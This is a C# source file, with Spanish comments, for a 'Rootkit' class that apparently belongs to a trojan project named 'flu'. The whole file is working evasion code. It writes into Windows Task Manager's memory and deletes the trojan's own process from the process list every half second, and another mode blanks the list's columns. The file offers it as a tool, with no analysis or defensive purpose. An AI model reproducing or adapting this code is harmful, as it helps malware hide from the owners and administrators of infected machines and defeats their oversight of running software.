using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Diagnostics;

namespace flu
{
    /// <summary>
    /// La clase Rootkit se encarga de ocultar el proceso
    /// Actualmente solo lo oculta de la lista de procesos en el Administrador de Tareas
    /// </summary>
    class Rootkit
    {
        // Variable para controlar el hilo secundario
        private static volatile bool endWorker = false;
        public static volatile bool hideOnlyTrojan = true;

        /* ======================= Constantes de la WinAPI ======================= */
        #region Constantes de la WinAPI

        // Procesos
        const int PROCESS_VM_OPERATION = 0x8; const int PROCESS_VM_READ = 0x10;
        const int PROCESS_VM_WRITE = 0x20; const int PROCESS_ALL_ACCESS = 0;

        // Memoria
        const int MEM_COMMIT = 0x1000; const int MEM_RESERVE = 0x2000;
        const int MEM_DECOMMIT = 0x4000; const int MEM_RELEASE = 0x8000;
        const int MEM_FREE = 0x10000; const int MEM_PRIVATE = 0x20000;
        const int MEM_MAPPED = 0x40000; const int MEM_TOP_DOWN = 0x100000;

        // Paginacion
        const int PAGE_NOACCESS = 0x1; const int PAGE_READONLY = 0x2;
        const int PAGE_READWRITE = 0x4; const int PAGE_WRITECOPY = 0x8;
        const int PAGE_EXECUTE = 0x10; const int PAGE_EXECUTE_READ = 0x20;
        const int PAGE_EXECUTE_READWRITE = 0x40; const int PAGE_EXECUTE_WRITECOPY = 0x80;
        const int PAGE_GUARD = 0x100; const int PAGE_NOCACHE = 0x200;

        // Mensajes
        const int LVM_FIRST = 0x1000;
        const int LVM_GETITEMCOUNT = (LVM_FIRST + 4); const int LVM_DELETEITEM = (LVM_FIRST + 8);
        const int LVM_GETITEMTEXTA = (LVM_FIRST + 45); const int LVM_SETITEMTEXTA = (LVM_FIRST + 46);
        const int LVM_DELETECOLUMN = 0x101C;

        #endregion
        /* ======================= Funciones de la WinAPI ======================= */
        #region Funciones de la WinAPI

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out UIntPtr lpNumberOfBytesRead);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);

        #endregion
        /* ======================= Funciones Propias ======================= */
        #region Funciones Propias
        /// <summary>
        /// Convierte una estructura en un array de bytes
        /// </summary>
        /// <param name="obj"></param>
        /// <returns></returns>
        static byte[] StructureToByteArray(object obj)
        {
            int len = Marshal.SizeOf(obj);
            byte[] arr = new byte[len];
            IntPtr ptr = Marshal.AllocHGlobal(len);
            Marshal.StructureToPtr(obj, ptr, true);
            Marshal.Copy(ptr, arr, 0, len);
            Marshal.FreeHGlobal(ptr);
            return arr;
        }

        /// <summary>
        /// Abre un proceso externo para poder acceder a su memoria reservada
        /// </summary>
        /// <param name="pid"></param>
        /// <returns></returns>
        static IntPtr OpenProcessHandle(uint pid)
        {
            return OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, pid);
        }

        /// <summary>
        /// Cierra un proceso externo abierto
        /// </summary>
        /// <param name="hProcess"></param>
        static void CloseProcessHandle(IntPtr hProcess)
        {
            CloseHandle(hProcess);
        }
 
        /// <summary>
        /// Reserva un bloque de memoria en la memoria de un proceso externo
        /// </summary>
        /// <param name="memSize"></param>
        /// <param name="hProcess"></param>
        /// <returns></returns>
        static IntPtr AllocExternalMemory(uint memSize, IntPtr hProcess)
        {
            return VirtualAllocEx(hProcess, IntPtr.Zero, memSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        }

        /// <summary>
        /// Libera un bloque de memoria de la memoria de un proceso externo
        /// </summary>
        /// <param name="hProcess"></param>
        /// <param name="MemAddress"></param>
        /// <param name="memSize"></param>
        static void FreeExternalMemory(IntPtr hProcess, IntPtr MemAddress, uint memSize)
        {
            VirtualFreeEx(hProcess, MemAddress, memSize, MEM_RELEASE);
        }
        #endregion
        /* ======================= Funciones especificas para manipular el Administrador de Tareas ======================= */
        #region
        /// <summary>
        /// Estructura que define un objeto en una lista
        /// </summary>
        [StructLayoutAttribute(LayoutKind.Sequential)]
        struct LVITEM
        {
            public uint mask; public IntPtr iItem; public IntPtr iSubItem;
            public uint state; public uint stateMask; public IntPtr pszText;
            public uint cchTextMax; public int iImage; public IntPtr lParam;
        }
        
        /// <summary>
        /// Funcion para localizar el Administrador de Tareas y dentro de el
        /// la columna con los procesos activos. Valido en español e ingles
        /// </summary>
        /// <returns></returns>
        static IntPtr FindTaskManager()
        {
            IntPtr ret;
            ret = FindWindow("#32770", "Administrador de tareas de Windows");
            if (ret == IntPtr.Zero)
            {
                ret = FindWindow("#32770", "Windows Task Manager");
                ret = FindWindowEx(ret, IntPtr.Zero, "#32770", (string)null);
                ret = FindWindowEx(ret, IntPtr.Zero, "SysListView32", "Processes");
            }
            else
            {
                ret = FindWindowEx(ret, IntPtr.Zero, "#32770", (string)null);
                ret = FindWindowEx(ret, IntPtr.Zero, "SysListView32", "Procesos");
            }
            return ret;
        }

        /// <summary>
        /// Devuelve el numero de elementos de una lista
        /// En este caso el numero de procesos activos 
        /// </summary>
        /// <param name="handle"></param>
        /// <returns></returns>
        static IntPtr GetItemCount(IntPtr handle)
        {
            return SendMessage(handle, LVM_GETITEMCOUNT, IntPtr.Zero, IntPtr.Zero);
        }

        /// <summary>
        /// Borra un elemento de una lista
        /// En este caso borra un proceso. Esto es temporal, ya que se actualiza cada 0.5 segundos 
        /// </summary>
        /// <param name="handle"></param>
        /// <param name="index"></param>
        static void DeleteItem(IntPtr handle, IntPtr index)
        {
            SendMessage(handle, LVM_DELETEITEM, index, IntPtr.Zero);
        }

        static void DeleteColumn(IntPtr handle)
        {
            SendMessage(handle, LVM_DELETECOLUMN, IntPtr.Zero, IntPtr.Zero);
        }

        /// <summary>
        /// Devuelve el nombre de un elemento de una lista
        /// En este caso devuelve el nombre de un proceso activo (proceso.exe) 
        /// </summary>
        /// <param name="handle"></param>
        /// <param name="index"></param>
        /// <returns></returns>
        static string GetItemText(IntPtr handle, IntPtr index)
        {
            byte[] str = new byte[50];
            UIntPtr bytesCount;
            uint pid;
            LVITEM process = new LVITEM();

            Rootkit.GetWindowThreadProcessId(handle, out pid);
            IntPtr hProcess = Rootkit.OpenProcessHandle(pid);
            IntPtr SharedProcMem = Rootkit.AllocExternalMemory((uint)Marshal.SizeOf(process), hProcess);
            IntPtr SharedProcMemString = Rootkit.AllocExternalMemory(50, hProcess);

            process.iItem = index;
            process.iSubItem = (IntPtr)0;
            process.cchTextMax = 50;
            process.pszText = SharedProcMemString;

            Rootkit.WriteProcessMemory(hProcess, SharedProcMem, StructureToByteArray(process), (uint)Marshal.SizeOf(process), out bytesCount);
            Rootkit.SendMessage(handle, LVM_GETITEMTEXTA, index, SharedProcMem);
            Rootkit.ReadProcessMemory(hProcess, SharedProcMemString, str, 50, out bytesCount);
            Rootkit.FreeExternalMemory(hProcess, SharedProcMem, (uint)Marshal.SizeOf(process));
            Rootkit.FreeExternalMemory(hProcess, SharedProcMemString, 50);
            Rootkit.CloseProcessHandle(hProcess);
            return Encoding.ASCII.GetString(str);
        }
        
        /// <summary>
        /// Borra el proceso solicitado del Administrador de Tareas
        /// Solo en la pestaña de procesos y solo durante un instante
        /// </summary>
        /// <param name="process"></param>
        static void HideProcess(string process)
        {
            string str;
            IntPtr handle = FindTaskManager();
            if (handle != IntPtr.Zero)
            {
                int tCount = (int)GetItemCount(handle);
                for (int i = 0; i < tCount; i++)
                {
                    str = GetItemText(handle, (IntPtr)i);
                    if (str.Contains(process)) { DeleteItem(handle, (IntPtr)i); }
                }
            }
        }

        /// <summary>
        /// Oculta el troyano y otros procesos al azar para dificultar
        /// la visualizacion del proceso
        /// </summary>
        static void HideAllProcesses()
        {
            IntPtr handle = FindTaskManager();
            if (handle != IntPtr.Zero)
            {
                DeleteColumn(handle); DeleteColumn(handle);
                DeleteColumn(handle); DeleteColumn(handle);
                DeleteColumn(handle);
            }
        }

        /// <summary>
        /// Oculta el troyano en el Administrador de Tareas indefinidamente
        /// Esto genera un hilo aparte del principal 
        /// </summary>
        public static void Hide()
        {
            Thread thread = new Thread(new ThreadStart(Worker));
            thread.Start();
        }
    
        /// <summary>
        /// Detiene el hilo que oculta el troyano
        /// Necesario al cerrarse o se quedara colgado
        /// </summary>
        public static void StopHiding()
        {
            endWorker = true;
        }

        /// <summary>
        /// Metodo que se repite infinitamente en el hilo extra
        /// y que se encarga de ocultar el proceso una y otra vez 
        /// </summary>
        static void Worker()
        {
            // Mientras no se desactive manualmente
            while (endWorker == false)
            {
                // Esconder el proceso [FIXME: usar una funcion para coger el nombre]
                if (hideOnlyTrojan)
                { HideProcess(Process.GetCurrentProcess().ProcessName + ".exe"); Thread.Sleep(525); }
                else
                { HideAllProcesses(); Thread.Sleep(1000); }

            }
            endWorker = false; // Para poder llamarlo de nuevo despues
        }
        #endregion
    }
}
